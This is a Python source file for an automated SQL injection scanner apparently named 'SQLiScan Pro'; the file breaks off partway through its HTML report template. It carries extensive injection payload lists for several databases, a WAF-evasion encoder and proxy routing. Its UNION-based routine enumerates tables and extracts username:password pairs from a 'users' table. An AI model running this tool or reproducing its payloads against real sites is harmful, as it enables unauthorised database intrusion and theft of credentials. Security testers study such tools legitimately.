#pip install aiohttp requests socks pdfkit jinja2 tqdm
import asyncio
import aiohttp
import time
import json
import os
import random
import re
import sys
from urllib.parse import urlparse, parse_qs, urlencode, quote
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import socket
import socks
from typing import Optional, Dict, List, Union, Tuple
import pdfkit
from jinja2 import Template
import warnings
import platform
import logging
import requests
from tqdm.asyncio import tqdm
import argparse
import functools

warnings.filterwarnings("ignore", category=DeprecationWarning)

INFO_PLUS = 25
logging.addLevelName(INFO_PLUS, "INFO+")
logging.SUCCESS = 26
logging.addLevelName(logging.SUCCESS, "SUCCESS")

class CustomLogger(logging.Logger):
    def info_plus(self, message, *args, **kwargs):
        if self.isEnabledFor(INFO_PLUS):
            self._log(INFO_PLUS, message, args, **kwargs)
    
    def success(self, message, *args, **kwargs):
        if self.isEnabledFor(logging.SUCCESS):
            self._log(logging.SUCCESS, message, args, **kwargs)

logging.setLoggerClass(CustomLogger)
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
console_handler = logging.StreamHandler(sys.stdout)
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
console_handler.setFormatter(formatter)
logger.addHandler(console_handler)

DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]

class RequestHandler:
    def __init__(self, headers: Dict, proxies: Dict, timeout: int = 15):
        self.headers = headers
        self.proxies = proxies
        self.timeout = aiohttp.ClientTimeout(total=timeout)

    @functools.lru_cache(maxsize=100)
    async def cached_request(self, url):
        return await self.send_async_request(url)

    async def send_async_request(self, session: aiohttp.ClientSession, url: str, method: str = "GET", params: Optional[Dict] = None, data: Optional[Dict] = None, delay: float = 0) -> Union[Dict, None]:
        request_start_time = time.time()
        try:
            proxy_url = self.proxies.get('http') or self.proxies.get('https')
            
            if method.upper() == "GET":
                async with session.get(url, params=params, proxy=proxy_url, timeout=self.timeout) as response:
                    content = await response.text()
            elif method.upper() == "POST":
                async with session.post(url, data=data, proxy=proxy_url, timeout=self.timeout) as response:
                    content = await response.text()
            else:
                logger.warning(f"Unsupported method: {method}")
                return None

            elapsed = time.time() - request_start_time
            if delay > 0:
                await asyncio.sleep(random.uniform(delay * 0.8, delay * 1.2))

            return {
                'status': response.status,
                'content': content,
                'headers': dict(response.headers),
                'request_params': params,
                'request_data': data,
                'elapsed': elapsed,
                'expected_delay': delay,
                'content_length': len(content)
            }
        except aiohttp.ClientError as e:
            logger.warning(f"Request failed (retrying...): {str(e)}")
            await asyncio.sleep(1)
            return await self.send_async_request(session, url, method, params, data)
        except asyncio.TimeoutError:
            logger.debug(f"Request to {url} ({method}) timed out after {self.timeout.total} seconds.")
            return None
        except Exception as e:
            logger.debug(f"An unexpected error occurred for {url} ({method}): {e}")
            return None

class PayloadManager:
    def __init__(self, payload_file: str = "payloads.json"):
        self.payload_file = payload_file
        self.payloads = {}
        self._load_payloads()
        self.waf_techniques = self._init_waf_bypass_techniques()

    def _load_payloads(self):
        default_payloads = {
            "time_based": {
                "generic": ["' AND SLEEP(5)-- -", ") WAITFOR DELAY '0:0:5'--", "' OR SLEEP(5) AND '1'='1"],
                "mysql": ["' AND SLEEP(5)#", "' AND BENCHMARK(10000000,MD5(1))#", "') UNION SELECT SLEEP(5)--"],
                "mssql": ["; WAITFOR DELAY '0:0:5'--", ") WAITFOR DELAY '0:0:5'--", "'; WAITFOR DELAY '0:0:5'--"],
                "oracle": ["' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM DUAL--", ") AND DBMS_LOCK.SLEEP(5)--", "') AND DBMS_LOCK.SLEEP(5)--"],
                "postgresql": ["' AND pg_sleep(5)--", ") AND pg_sleep(5)--", "') AND pg_sleep(5)--"],
                "nosql": ["' || '1'=='1", "' || 1==1//"]
            },
            "blind": {
                "generic": ["' AND '1'='1", "' AND '1'='2", "') AND ('1'='1'"],
                "mysql": ["' AND 1=1#", "' AND 1=2#", "') AND (1=1)--", "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7178787171, (SELECT MID(IFNULL(CAST(RAND() AS CHAR),0x20),1,50)), 0x7178787171, FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--"],
                "mssql": ["' AND 1=1--", "' AND 1=2--", "') AND (1=1)--", "'; WAITFOR DELAY '0:0:0'--"],
                "oracle": ["' AND 1=1--", "' AND 1=2--", "') AND (1=1)--"],
                "postgresql": ["' AND 1=1--", "' AND 1=2--", "') AND (1=1)--"],
                "nosql": ["[$ne]=1", "[$gt]="]
            },
            "error_based": {
                "generic": ["' AND 1=CONVERT(int,@@version)--", "' AND 1=1/0--", "'+(SELECT 1 FROM RDB$DATABASE)--"],
                "mysql": ["' AND EXTRACTVALUE(1,CONCAT(0x5c,@@version))--", "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,@@version,0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--"],
                "mssql": ["' AND 1=CONVERT(int,@@version)--", " DECLARE @X INT;SET @X = 1/0;--"],
                "oracle": ["' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--", "' AND 1=(SELECT UTL_INADDR.GET_HOST_ADDRESS FROM DUAL)--"],
                "postgresql": ["' AND CAST(version() AS INTEGER)--", "' AND 1=CAST((SELECT 1 FROM PG_SLEEP(0)) AS INT)--"],
                "sqlite": ["' AND 1=CAST(RANDOMBLOB(100000000) AS INTEGER)--", "' AND 1=ABS(RANDOMBLOB(100000000))--"],
                "nosql": ["'", "{$gt: ''}"]
            },
            "union": {
                "generic": ["' UNION SELECT null,null--", "' UNION SELECT @@version,null--", "' UNION SELECT 'a','b'--"],
                "mysql": ["' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--", "' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--"],
                "mssql": ["' UNION SELECT 1,table_name FROM information_schema.tables--", "' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'--"],
                "oracle": ["' UNION SELECT 1,table_name FROM all_tables--", "' UNION SELECT 1,column_name FROM all_tab_columns WHERE table_name='USERS'--"],
                "postgresql": ["' UNION SELECT 1,table_name FROM information_schema.tables--", "' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'--"],
                "sqlite": ["' UNION SELECT 1,tbl_name FROM sqlite_master WHERE type='table'--", "' UNION SELECT 1,name FROM sqlite_master WHERE type='table' AND name='users'--"]
            },
            "dbms_detection": {
                "mysql": ["' AND @@version_comment LIKE '%MySQL%'--", "' AND BENCHMARK(1,1)--"],
                "mssql": ["' AND @@version LIKE '%Microsoft%'--", "; SELECT @@version--"],
                "oracle": ["' AND (SELECT * FROM v$version) IS NOT NULL--", "' AND (SELECT banner FROM v$version WHERE rownum=1) IS NOT NULL--"],
                "postgresql": ["' AND version() LIKE '%PostgreSQL%'--", "' AND pg_version() IS NOT NULL--"],
                "sqlite": ["' AND sqlite_version()--", "' AND (SELECT name FROM sqlite_master WHERE type='table') IS NOT NULL--"],
                "nosql": ["' || '1'=='1", "' || 1==1//"]
            }
        }
        
        try:
            if os.path.exists(self.payload_file):
                with open(self.payload_file, 'r') as f:
                    self.payloads = json.load(f)
                logger.info(f"Custom payloads loaded from {self.payload_file}")
            else:
                self.payloads = default_payloads
                logger.info("Using default payloads.")
                
            self._load_payload_plugins()
                
        except json.JSONDecodeError:
            logger.error(f"Error decoding JSON from {self.payload_file}. Using default payloads.")
            self.payloads = default_payloads
        except Exception as e:
            logger.error(f"Error loading payloads: {e}. Using default payloads.")
            self.payloads = default_payloads
    
    def _load_payload_plugins(self):
        plugin_dir = "payload_plugins"
        if not os.path.exists(plugin_dir):
            return
            
        logger.info_plus(f"Loading payload plugins from '{plugin_dir}'...")
        for plugin_file in os.listdir(plugin_dir):
            if plugin_file.endswith(".json"):
                plugin_path = os.path.join(plugin_dir, plugin_file)
                try:
                    with open(plugin_path, 'r') as f:
                        plugin_data = json.load(f)
                        for category in plugin_data:
                            if category not in self.payloads:
                                self.payloads[category] = {}
                            for dbms in plugin_data[category]:
                                if dbms not in self.payloads[category]:
                                    self.payloads[category][dbms] = []
                                self.payloads[category][dbms].extend(plugin_data[category][dbms])
                    logger.info_plus(f"Loaded plugin: {plugin_file}")
                except json.JSONDecodeError:
                    logger.error(f"Error decoding JSON from plugin file: {plugin_file}. Skipping.")
                except Exception as e:
                    logger.error(f"Error loading plugin {plugin_file}: {e}. Skipping.")
    
    def _init_waf_bypass_techniques(self) -> List[Tuple[str, str]]:
        return [
            (" ", "/**/"), (" ", "%0A"), (" ", "%09"), (" ", "%0B"), (" ", "%0C"), (" ", "%0D"), (" ", "%A0"), 
            (" ", "/*random*/"), (" ", "/*!00000*/"),
            ("'", "%27"), ("'", "%2527"), ("'", "''"),
            ("AND", "/*!AND*/"), ("OR", "/*!OR*/"), ("SELECT", "SEL%0bECT"), ("UNION", "UNI%0aON"),
            ("FROM", "FR%0cOM"), ("WHERE", "WH%0dERE"), ("ORDER", "ORD%0aER"), ("BY", "B%0dY"),
            ("=", "%3D"), ("=", " LIKE "),
            ("--", "%23"), ("--", "%2D%2D%20"),
        ]
    
    def get_payloads(self, category: str, dbms: str = "generic") -> List[str]:
        return self.payloads.get(category, {}).get(dbms, self.payloads.get(category, {}).get("generic", []))

    def apply_waf_bypass(self, payload: str) -> List[str]:
        variations = [payload]
        
        for old, new in self.waf_techniques:
            if old in payload:
                variations.append(payload.replace(old, new))
        
        variations.append(payload.upper())
        variations.append(payload.lower())
        
        for keyword in ["SELECT", "UNION", "AND", "OR", "FROM", "WHERE", "ORDER", "BY"]:
            if keyword in payload.upper():
                variations.append(re.sub(keyword, f"{keyword[:2]}/**/{keyword[2:]}", payload, flags=re.IGNORECASE))
                variations.append(re.sub(keyword, f"{keyword[0]}/*{keyword[1:]}*/", payload, flags=re.IGNORECASE)) 

        variations.append(quote(payload))
        variations.append(quote(payload, safe=''))

        if any(c in payload for c in "'\"<>&|;"): 
            char_encoded = ""
            for char_code in payload:
                char_encoded += f"CHAR({ord(char_code)})"
            if char_encoded:
                variations.append(char_encoded)

            hex_encoded = "0x" + ''.join([f"{ord(c):02x}" for c in payload])
            if hex_encoded != "0x":
                variations.append(hex_encoded)
            
        return list(set(variations))

class SecondOrderDetector:
    async def check_second_order(self, session, response):
        forms = self._extract_forms(response['content'])
        for form in forms:
            await self._test_form_submission(session, form)

    def _extract_forms(self, content):
        forms = []
        form_matches = re.finditer(r'<form[^>]*>(.*?)</form>', content, re.DOTALL | re.IGNORECASE)
        for match in form_matches:
            forms.append(match.group())
        return forms

    async def _test_form_submission(self, session, form):
        pass

class DetectionEngine:
    def __init__(self):
        self.error_patterns = self._init_error_patterns()
        self.extracted_data = {}
        self.second_order_detector = SecondOrderDetector()

    def _init_error_patterns(self):
        return {
            "mysql": [
                r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"MySQL Query fail",
                r"MySQL server version", r"You have an error in your SQL syntax",
                r"supplied argument is not a valid MySQL result resource",
                r"Unknown column '[^']+' in 'field list'", r"Column count doesn't match value count at row",
                r"PROCEDURE ANALYSE", r"ORDER BY"
            ],
            "mssql": [
                r"Microsoft SQL Server", r"SQL Server.*Driver", r"ODBC SQL Server Driver",
                r"SQL Server Native Client", r"Unclosed quotation mark after the character string",
                r"Implicit conversion from data type varchar to varbinary is not allowed",
                r"Incorrect syntax near", r"Cannot insert the value NULL into column",
                r"xp_cmdshell", r"sqlcmd", r"Cannot resolve the collation conflict"
            ],
            "oracle": [
                r"ORA-[0-9]{5}", r"Oracle error", r"Oracle.*Driver", r"Oracle DB",
                r"SQL command not properly ended", r"quoted string not properly terminated",
                r"invalid character", r"FROM DUAL", r"DBMS_UTILITY", r"UTL_INADDR",
                r"invalid number"
            ],
            "postgresql": [
                r"PostgreSQL.*ERROR", r"pg_.*error", r"PostgreSQL query failed",
                r"org.postgresql.util.PSQLException", r"syntax error at or near",
                r"column \"[^\"]+\" does not exist", r"division by zero",
                r"LINE \d+:"
            ],
            "sqlite": [
                r"SQLite error", r"near \".*\": syntax error", r"unrecognized token",
                r"SQLITE_ERROR", r"no such table", r"misuse of aggregate function",
                r"unrecognized keyword", r"SQL error or missing database"
            ],
            "nosql": [
                r"MongoDB.*error", r"MongoError", r"Unexpected token",
                r"SyntaxError", r"CastError", r"ValidationError"
            ]
        }
    
    def detect_dbms_from_error(self, content: str) -> Optional[str]:
        for dbms, patterns in self.error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    return dbms
        return None
    
    def detect_dbms_from_headers(self, headers: Dict) -> Optional[str]:
        headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
        
        x_powered_by = headers_lower.get('x-powered-by', '')
        if 'asp.net' in x_powered_by:
            return 'mssql'
        if 'express' in x_powered_by.lower():
            return 'nosql'

        server = headers_lower.get('server', '')
        if 'iis' in server:
            return 'mssql'
        if 'resin' in server:
            return 'oracle' 
        if 'mongodb' in server.lower():
            return 'nosql'

        if 'x-aspnet-version' in headers_lower:
            return 'mssql'
        
        return None

    async def detect_dbms_async(self, request_handler: RequestHandler, session: aiohttp.ClientSession, url: str, param: str, method: str, original_params: Dict, original_data: Dict) -> Optional[str]:
        base_response = await request_handler.send_async_request(session, url, method, params=original_params, data=original_data)
        if base_response:
            await self.second_order_detector.check_second_order(session, base_response)
            dbms_from_header = self.detect_dbms_from_headers(base_response['headers'])
            if dbms_from_header:
                logger.debug(f"DBMS detected from HTTP headers: {dbms_from_header.upper()}")
                return dbms_from_header

        dbms_tests = {
            "mysql": ["' AND @@version_comment LIKE '%MySQL%'--", "'-1' UNION SELECT @@version --"],
            "mssql": ["' AND @@version LIKE '%Microsoft%'--", "'; WAITFOR DELAY '0:0:0' --"],
            "oracle": ["' AND (SELECT * FROM v$version) IS NOT NULL FROM DUAL--", "') AND (SELECT NULL FROM DUAL) IS NULL--"],
            "postgresql": ["' AND version() LIKE '%PostgreSQL%'--", "'-1' UNION SELECT version()--"],
            "sqlite": ["' AND sqlite_version()--", "' AND (SELECT name FROM sqlite_master WHERE type='table') IS NOT NULL--"],
            "nosql": ["' || '1'=='1", "' || 1==1//"]
        }
        
        tasks = []
        for dbms, payloads in dbms_tests.items():
            for payload in payloads:
                test_params = original_params.copy()
                test_data = original_data.copy()
                
                if method.upper() == "GET":
                    test_params[param] = payload
                else:
                    test_data[param] = payload

                tasks.append((dbms, asyncio.create_task(
                    request_handler.send_async_request(session, url, method, params=test_params, data=test_data)
                )))

        for dbms, task in tasks:
            result = await task
            if result:
                detected = self.detect_dbms_from_error(result['content'])
                if detected:
                    return detected
                
                content_lower = result['content'].lower()
                if dbms == "mysql" and ("mysql" in content_lower or "mariadb" in content_lower):
                    return "mysql"
                if dbms == "mssql" and "microsoft sql server" in content_lower:
                    return "mssql"
                if dbms == "oracle" and ("oracle database" in content_lower or "pl/sql" in content_lower):
                    return "oracle"
                if dbms == "postgresql" and "postgresql" in content_lower:
                    return "postgresql"
                if dbms == "sqlite" and "sqlite" in content_lower:
                    return "sqlite"
                if dbms == "nosql" and ("mongodb" in content_lower or "bson" in content_lower):
                    return "nosql"
        return None

    async def check_blind_sql_async(self, request_handler: RequestHandler, session: aiohttp.ClientSession, url: str, param: str, method: str, original_params: Dict, original_data: Dict, dbms: str, base_response: Dict, payload_manager: PayloadManager) -> Optional[Dict]:
        payloads = payload_manager.get_payloads("blind", dbms)
        original_value = original_params.get(param, '') if method.upper() == "GET" else original_data.get(param, '')
        
        if not original_value:
            return None

        true_payload_suffix_str = " AND '1'='1" 
        false_payload_suffix_str = " AND '1'='2" 
        true_payload_suffix_num = " AND 1=1" 
        false_payload_suffix_num = " AND 1=2" 
        
        test_payloads = [
            (original_value + true_payload_suffix_str, original_value + false_payload_suffix_str, "String Context"),
            (original_value + true_payload_suffix_num, original_value + false_payload_suffix_num, "Numeric Context")
        ]
        
        if dbms == "nosql":
            test_payloads.extend([
                (original_value + "[$ne]=1", original_value + "[$ne]=2", "NoSQL Context"),
                (original_value + " || 1==1", original_value + " || 1==0", "NoSQL JavaScript Context")
            ])

        for true_payload, false_payload, context_desc in test_payloads:
            true_result = await self._send_test_payload(request_handler, session, url, param, method, original_params, original_data, true_payload)
            false_result = await self._send_test_payload(request_handler, session, url, param, method, original_params, original_data, false_payload)

            if true_result and false_result:
                if true_result['status'] == 200 and false_result['status'] != 200:
                    return {'type': 'Blind SQLi (Status Code Diff)', 'parameter': param, 'payload': f"{true_payload} (True) / {false_payload} (False)", 'details': f"Status: True ({true_result['status']}) vs False ({false_result['status']}) - Context: {context_desc}"}
                
                true_hash = hash(true_result['content'])
                false_hash = hash(false_result['content'])
                if true_hash != false_hash:
                    return {'type': 'Blind SQLi (Content Hash Diff)', 'parameter': param, 'payload': f"{true_payload} (True) / {false_payload} (False)", 'details': f"Content hash differs significantly - Context: {context_desc}"}
                
                true_len = true_result['content_length']
                false_len = false_result['content_length']
                if abs(true_len - false_len) > max(10, 0.1 * min(true_len, false_len, 1)):
                    return {'type': 'Blind SQLi (Content Length Diff)', 'parameter': param, 'payload': f"{true_payload} (True) / {false_payload} (False)", 'details': f"Content length: True ({true_len}) vs False ({false_len}) - Context: {context_desc}"}
                
                base_content = base_response['content']
                if (true_result['content'] != base_content) and (false_result['content'] == base_content):
                     return {'type': 'Blind SQLi (Content Match)', 'parameter': param, 'payload': f"{true_payload} (True) / {false_payload} (False)", 'details': f"True condition payload yields different content than base, while false condition matches base - Context: {context_desc}"}
                
        return None

    async def check_time_based_sql_async(self, request_handler: RequestHandler, session: aiohttp.ClientSession, url: str, param: str, method: str, original_params: Dict, original_data: Dict, dbms: str, delay: float = 5, payload_manager: PayloadManager = None) -> Optional[Dict]:
        if payload_manager is None:
            payload_manager = PayloadManager()

        payloads = payload_manager.get_payloads("time_based", dbms)
        original_value = original_params.get(param, '') if method.upper() == "GET" else original_data.get(param, '')
        
        if not original_value:
            return None

        contexts = ["'", "", ")", "'))", "\"", "')))", "))))))"]
        
        tasks = []
        payload_count = 0
        for payload_suffix in payloads:
            for context_prefix in contexts:
                full_payload = original_value + context_prefix + payload_suffix
                for variation in payload_manager.apply_waf_bypass(full_payload):
                    tasks.append(asyncio.create_task(
                        self._send_test_payload(request_handler, session, url, param, method, original_params, original_data, variation, delay)
                    ))
                    payload_count += 1
        
        logger.debug(f"Time-based SQLi: {payload_count} payloads generated for {param}")

        for task in asyncio.as_completed(tasks):
            result = await task
            if result and result.get('elapsed', 0) >= delay * 0.9:
                return {
                    'type': 'Time-Based SQLi', 
                    'parameter': param, 
                    'payload': (result['request_params'][param] if result['request_params'] else result['request_data'][param])[:100] + "..." if result else "N/A",
                    'details': f"Response time: {result.get('elapsed', 0):.2f}s (expected ~{delay}s). " \
                               f"Payload: {(result['request_params'][param] if result['request_params'] else result['request_data'][param])[:100]}..."
                }
        return None
    
    async def check_error_based_sql_async(self, request_handler: RequestHandler, session: aiohttp.ClientSession, url: str, param: str, method: str, original_params: Dict, original_data: Dict, dbms: str, payload_manager: PayloadManager = None) -> Optional[Dict]:
        if payload_manager is None:
            payload_manager = PayloadManager()

        payloads = payload_manager.get_payloads("error_based", dbms)
        original_value = original_params.get(param, '') if method.upper() == "GET" else original_data.get(param, '')
        
        if not original_value:
            return None

        contexts = ["'", "", ")", "'))", "\"", "')))", "))))))"]

        tasks = []
        payload_count = 0
        for payload_suffix in payloads:
            for context_prefix in contexts:
                full_payload = original_value + context_prefix + payload_suffix
                for variation in payload_manager.apply_waf_bypass(full_payload):
                    tasks.append(asyncio.create_task(
                        self._send_test_payload(request_handler, session, url, param, method, original_params, original_data, variation)
                    ))
                    payload_count += 1
        
        logger.debug(f"Error-based SQLi: {payload_count} payloads generated for {param}")

        for task in asyncio.as_completed(tasks):
            result = await task
            if result:
                detected_dbms = self.detect_dbms_from_error(result['content'])
                if detected_dbms:
                    return {
                        'type': 'Error-Based SQLi', 
                        'parameter': param, 
                        'payload': (result['request_params'][param] if result['request_params'] else result['request_data'][param])[:100] + "..." if result else "N/A",
                        'details': f"Detected DBMS: {detected_dbms.upper()}. Error: {result['content'][:200].strip()}..."
                    }
        return None
    
    async def check_union_sql_async(self, request_handler: RequestHandler, session: aiohttp.ClientSession, url: str, param: str, method: str, original_params: Dict, original_data: Dict, dbms: str, payload_manager: PayloadManager = None) -> Optional[Dict]:
        if payload_manager is None:
            payload_manager = PayloadManager()

        original_value = original_params.get(param, '') if method.upper() == "GET" else original_data.get(param, '')
        
        if not original_value:
            return None

        column_count = 0
        order_by_contexts = ["'", "", ")", "'))"]
        
        for context_prefix in order_by_contexts:
            for i in range(1, 20):
                test_payload_suffix = f" ORDER BY {i}--"
                full_test_payload = original_value + context_prefix + test_payload_suffix
                
                result = await self._send_test_payload(request_handler, session, url, param, method, original_params, original_data, full_test_payload, delay=1)
                
                if result:
                    content_lower = result['content'].lower()
                    error_found = False
                    for pattern_list in self.error_patterns.values():
                        for pattern in pattern_list:
                            if re.search(pattern, content_lower):
                                error_found = True
                                break
                        if error_found: break

                    if (("unknown column" in content_lower and "order by" in content_lower) or 
                       ("order by clause is not valid" in content_lower) or 
                       ("incorrect column name" in content_lower) or 
                       ("column number" in content_lower and "is out of range" in content_lower) or
                       (error_found and result['status'] != 200 and i > 1)):
                        column_count = i - 1
                        logger.debug(f"Determined column count {column_count} with context '{context_prefix}'")
                        break
                    elif result['status'] == 200 and i == 19:
                        column_count = i
                        logger.debug(f"Max column count reached ({column_count}) with context '{context_prefix}'")
                        break
                if column_count > 0:
                    break 

        if column_count == 0: 
            logger.debug(f"Could not determine column count reliably for {url} parameter {param}")
            return None
        
        logger.info_plus(f"Determined {column_count} columns for UNION-based SQLi on {param}.")

        injectable_column_index = -1
        union_test_contexts = ["'", ""]
        
        for context_prefix in union_test_contexts:
            for i in range(column_count):
                test_union_payload_list = ['null'] * column_count
                test_string = f"sqliTEST{random.randint(1000,9999)}"
                test_union_payload_list[i] = f"'{test_string}'" 
                
                payload_prefix = ""
                if context_prefix == "" and original_value.strip().endswith("'"):
                    payload_prefix = "'"
                
                test_union_payload_suffix = f"{payload_prefix} UNION SELECT {','.join(test_union_payload_list)}--"
                
                full_test_payload = original_value + context_prefix + test_union_payload_suffix
                
                result = await self._send_test_payload(request_handler, session, url, param, method, original_params, original_data, full_test_payload)
                if result and result['status'] == 200 and test_string in result['content']:
                    injectable_column_index = i
                    logger.info_plus(f"Injectable column found at index {injectable_column_index + 1} with context '{context_prefix}'.")
                    break
            if injectable_column_index != -1:
                break
        
        if injectable_column_index == -1:
            logger.warning(f"Could not find an injectable column for UNION-based SQLi on {param}.")
            return None

        final_union_payloads = []

        final_union_payloads.append((f"dbms_version", f"@@version"))
        final_union_payloads.append((f"current_user", f"user()"))
        
        if dbms == "mysql":
            final_union_payloads.append((f"database_name", f"database()"))
            final_union_payloads.append((f"hostname", f"@@hostname"))
            final_union_payloads.append((f"table_names", f"group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()"))
            final_union_payloads.append((f"column_names_users", f"group_concat(column_name) FROM information_schema.columns WHERE table_name='users'"))
            final_union_payloads.append((f"users_data_example", f"group_concat(username,0x3a,password) FROM users"))
        elif dbms == "mssql":
            final_union_payloads.append((f"db_name", f"DB_NAME()"))
            final_union_payloads.append((f"user_name", f"SYSTEM_USER"))
            final_union_payloads.append((f"server_name", f"@@SERVERNAME"))
            final_union_payloads.append((f"table_names", f"table_name FROM information_schema.tables"))
            final_union_payloads.append((f"column_names_users", f"column_name FROM information_schema.columns WHERE table_name='users'"))
            final_union_payloads.append((f"users_data_example", f"username + ':' + password FROM users"))
        elif dbms == "oracle":
            final_union_payloads.append((f"db_name", f"GLOBAL_NAME FROM GLOBAL_NAME"))
            final_union_payloads.append((f"user_name", f"USER FROM DUAL"))
            final_union_payloads.append((f"table_names", f"table_name FROM all_tables WHERE owner = USER"))
            final_union_payloads.append((f"column_names_users", f"column_name FROM all_tab_columns WHERE table_name='USERS' AND owner = USER"))
        elif dbms == "postgresql":
            final_union_payloads.append((f"db_name", f"current_database()"))
            final_union_payloads.append((f"table_names", f"string_agg(table_name, ',') FROM information_schema.tables WHERE table_schema = current_schema()"))
            final_union_payloads.append((f"column_names_users", f"string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='users' AND table_schema = current_schema()"))
        elif dbms == "sqlite":
            final_union_payloads.append((f"db_version", f"sqlite_version()"))
            final_union_payloads.append((f"table_names", f"group_concat(tbl_name) FROM sqlite_master WHERE type='table'"))
            final_union_payloads.append((f"column_names_users", f"group_concat(name) FROM pragma_table_info('users')"))

        extracted_data = {}
        found_union_vulnerability = False

        for key, select_stmt in final_union_payloads:
            union_parts = ['null'] * column_count
            
            data_marker_start = f"sqliDATASTART{random.randint(1000,9999)}"
            data_marker_end = f"sqliDATAEND{random.randint(1000,9999)}"
            
            if dbms == "mysql":
                inject_value = f"CONCAT(0x{data_marker_start.encode().hex()},{select_stmt},0x{data_marker_end.encode().hex()})"
            elif dbms == "mssql":
                inject_value = f"'{data_marker_start}' + CAST({select_stmt} AS NVARCHAR(MAX)) + '{data_marker_end}'"
            elif dbms in ["postgresql", "sqlite", "oracle"]:
                inject_value = f"'{data_marker_start}' || ({select_stmt}) || '{data_marker_end}'"
            else:
                inject_value = f"'{data_marker_start}' || ({select_stmt}) || '{data_marker_end}'"

            union_parts[injectable_column_index] = inject_value
            
            union_payload_suffix = f"{context_prefix} UNION SELECT {','.join(union_parts)}--"
            full_exploit_payload = original_value + union_payload_suffix
            
            result = await self._send_test_payload(request_handler, session, url, param, method, original_params, original_data, full_exploit_payload)
            
            if result and result['status'] == 200:
                data_regex = re.compile(re.escape(data_marker_start) + r'(.*?)' + re.escape(data_marker_end), re.DOTALL)
                matches = data_regex.findall(result['content'])
                
                if matches:
                    extracted_data[key] = list(set(matches))
                    found_union_vulnerability = True
                    logger.info_plus(f"Extracted {key}: {', '.join(extracted_data[key])}")
        
        if found_union_vulnerability:
            self.extracted_data.update(extracted_data)
            return {
                'type': 'UNION SQLi (Exploitable)', 
                'parameter': param, 
                'payload': f"Union select with {column_count} columns and data extraction attempts.",
                'details': "Successfully identified UNION-based injection and attempted data extraction. See 'Extracted Data' in report."
            }
        
        if column_count > 0:
            return {
                'type': 'Possible UNION SQLi', 
                'parameter': param, 
                'payload': f"Order by {column_count} columns successful, but no data extracted.",
                'details': "UNION-based injection detected via column ordering. Further manual exploitation might be possible."
            }
        
        return None

    async def _send_test_payload(self, request_handler: RequestHandler, session: aiohttp.ClientSession, url: str, param: str, method: str, original_params: Dict, original_data: Dict, payload: str, delay: float = 0) -> Union[Dict, None]:
        if method.upper() == "GET":
            params = original_params.copy()
            if original_params.get(param) is not None:
                params[param] = str(original_params.get(param)) + payload
            else:
                params[param] = payload
            
            return await request_handler.send_async_request(session, url, method, params=params, delay=delay)
        elif method.upper() == "POST":
            data = original_data.copy()
            if original_data.get(param) is not None:
                data[param] = str(original_data.get(param)) + payload
            else:
                data[param] = payload
            return await request_handler.send_async_request(session, url, method, data=data, delay=delay)
        return None

class ExploitEngine:
    async def exploit(self, vulnerability):
        if vulnerability['type'] == 'UNION SQLi':
            return await self._extract_data(vulnerability)
        return None

    async def _extract_data(self, vulnerability):
        pass

class ReportGenerator:
    def __init__(self, report_data: Dict):
        self.report_data = report_data

    def _generate_html_report(self) -> str:
        template_str = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>SQLiScan Pro Report</title>
            <meta charset="UTF-8">
            <style>
                body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; margin: 0; padding: 20px; background-color: #f4f7f6; color: #333; }
                .container { max-width: 1000px; margin: auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
                .header { background: #2c3e50; color: white; padding: 25px; border-radius: 8px 8px 0 0; text-align: center; }
                .header h1 { margin: 0; font-size: 2.5em; }
                .header p { margin: 5px 0 0; font-size: 0.9em; opacity: 0.8; }
                h2 { color: #2c3e50; border-bottom: 2px solid #e0e0e0; padding-bottom: 10px; margin-top: 30px; font-size: 1.8em; }
                h3 { color: #34495e; font-size: 1.4em; margin-top: 20px; }
                .vulnerability, .info, .success { padding: 18px; margin: 15px 0; border-radius: 6px; }
                .vulnerability { background: #ffebee; border-left: 6px solid #d32f2f; color: #b71c1c; }
                .info { background: #e3f2fd; border-left: 6px solid #2196f3; color: #1565c0; }
                .success { background: #e8f5e9; border-left: 6px solid #4caf50; color: #2e7d32; }
                table { width: 100%; border-collapse: collapse; margin: 20px 0; font-size: 0.9em; }
                th, td { border: 1px solid #e0e0e0; padding: 12px; text-align: left; vertical-align: top; }
                th { background-color: #f7f7f7; color: #555; font-weight: 600; }
                tr:nth-child(even) { background-color: #fcfcfc; }
                code { background-color: #e0e0e0; padding: 2px 5px; border-radius: 3px; font-family: 'Courier New', monospace; font-size: 0.9em; }
